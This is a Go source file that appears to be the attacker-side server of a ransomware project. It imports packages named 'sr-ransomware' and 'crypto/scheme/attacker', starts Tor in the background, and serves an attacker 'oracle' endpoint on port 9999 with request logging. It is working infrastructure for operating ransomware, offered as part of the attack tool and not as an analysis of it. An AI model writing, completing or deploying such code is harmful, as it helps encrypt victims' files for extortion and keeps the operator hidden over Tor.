package main

import (
    "os"
    "log"
    "net/http"

    "github.com/julienschmidt/httprouter"
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/attacker"
)

func main() {
    // start tor in the background
    tor := exe.NewTor("", os.Getenv("FLUTORRC"))

    log.Println("Starting tor")
    tor.Start()
    defer tor.Close()

    // http router config
    router := httprouter.New()
    router.Handler("GET", "/oracle", attacker.NewOracle())

    // start server
    log.Println("Starting server")
    go func(){
        log.Fatal(http.ListenAndServe(":9999", loggingMiddleware(router)))
    }()

    <-signalListener()
    log.Println("Exiting")
}

func loggingMiddleware(next http.Handler) http.Handler {
    handler := func(w http.ResponseWriter, r *http.Request) {
        log.Printf("%s\t%s\t%s\n", r.RemoteAddr, r.Method, r.RequestURI)
        next.ServeHTTP(w, r)
    }
    return http.HandlerFunc(handler)
}
